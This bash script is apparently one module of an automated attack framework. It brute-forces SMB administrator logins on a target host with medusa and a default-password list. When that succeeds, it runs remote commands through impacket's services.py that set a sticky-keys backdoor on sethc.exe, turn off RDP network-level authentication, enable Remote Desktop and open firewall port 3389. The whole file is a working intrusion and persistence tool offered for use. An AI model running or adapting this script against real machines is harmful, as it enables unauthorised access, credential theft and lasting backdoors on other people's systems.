#!/bin/bash
# Args: $1=IP  $2=MAC  $3=ATTACKER_IP
# Env:  KARMA_OUT

WAIT=2
DPORT=445
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
WORDLIST="$SCRIPT_DIR/default_pass_for_services_unhash.txt"
TIME="$(date +'%H:%M:%S_%d.%m.%Y')"
OUT="${KARMA_OUT:-$SCRIPT_DIR/../..}"
mkdir -p "$OUT"
OUTFILE="$OUT/smb-brute-${1}_${TIME}.txt"

if ! nc -nw $WAIT "$1" $DPORT </dev/null 2>/dev/null; then
	exit 0
fi

function pwn(){
	local target="$1" user="$2" password="$3"
	echo "[*] attempting backdoor via services.py on $target ($user:$password)" | tee -a "$OUTFILE"
	# Enable RDP + sticky keys backdoor via impacket services
	for cmd in \
		'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t reg_sz /d "\windows\system32\cmd.exe"' \
		'reg add "HKLM\system\currentcontrolset\control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0x0 /f' \
		'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' \
		'net start TermService' \
		'netsh advfirewall firewall add rule name="Remote Desktop" dir=in action=allow protocol=TCP localport=3389'; do
		services.py "$user:$password@$target" create -name 1 -display 1 -path "$cmd" >/dev/null 2>&1
		services.py "$user:$password@$target" start -name 1 >/dev/null 2>&1
		services.py "$user:$password@$target" delete -name 1 >/dev/null 2>&1
	done
}

echo "[*] bruteforcing SMB on $1" | tee "$OUTFILE"
for user in administrator admin Administrator Администратор; do
	found=$(medusa -M smbnt -m PASS:PASSWORD -h "$1" -u "$user" \
		-P "$WORDLIST" 2>/dev/null | grep 'SUCCESS (ADMIN\$ - Access Allowed)')
	if [ -n "$found" ]; then
		echo "[+] SMB credentials FOUND: $1 user=$user" | tee -a "$OUTFILE"
		echo "$found" | tee -a "$OUTFILE"
		password=$(echo "$found" | sed -rn 's/.*Password: (.*) \[SUCCESS.*/\1/p')
		pwn "$1" "$user" "$password"
		break
	fi
done

if ! grep -q '\[+\]' "$OUTFILE"; then
	echo "[-] SMB brute: no credentials found on $1" | tee -a "$OUTFILE"
fi
